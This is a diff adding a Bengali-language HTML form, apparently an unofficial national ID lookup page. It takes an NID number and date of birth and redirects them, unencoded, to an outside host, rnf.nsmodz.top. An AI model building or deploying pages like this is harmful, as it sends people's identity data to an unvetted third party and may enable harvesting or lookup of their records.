@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NID সার্ভার</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f0f0;
+            background-image: linear-gradient(to bottom, #f0f0f0, #ccc);
+        }
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin: 20px auto;
+            border-radius: 50%;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .box {
+            width: 400px;
+            margin: 50px auto;
+            padding: 30px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            background-color: #fff;
+            animation: fadeIn 2s;
+        }
+        .box input {
+            width: 100%;
+            height: 40px;
+            margin-bottom: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .box button {
+            width: 100%;
+            height: 40px;
+            background-color: #337ab7;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            animation: pulse 2s infinite;
+        }
+        .box button:hover {
+            background-color: #23527c;
+        }
+        /* Add glow effect to text */
+        * {
+            text-shadow: 0 0 10px #ff0000;
+        }
+        .document {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            background-color: #fff;
+        }
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <img src="https://i.ibb.co/zbQz1YY/IMG-20240622-231607-680-removebg-preview.png" alt="NID সার্ভার লোগো" class="logo">
+    <h1 style="text-shadow: 0 0 10px #ff0000;">NID সার্ভার</h1>
+    <div class="box">
+        <input type="text" id="nid" placeholder="NID নম্বর" style="text-shadow: 0 0 10px #ff0000;">
+        <input type="text" id="dob" placeholder="জন্ম তারিখ (dd-mm-yyyy)" style="text-shadow: 0 0 10px #ff0000;">
+        <button onclick="submitForm()" style="text-shadow: 0 0 10px #ff0000;">সাবমিট</button>
+    </div>
+    <div class="document" id="document">
+        <h2></h2>
+        <p></p>
+    </div>
+
+    <script>
+        function submitForm() {
+            var nid = document.getElementById("nid").value;
+            var dob = document.getElementById("dob").value;
+            window.location.href = "https://rnf.nsmodz.top/server.php?nid=" + nid + "&dob=" + dob;
+            document.getElementById("document").style.display = "block";
+        }
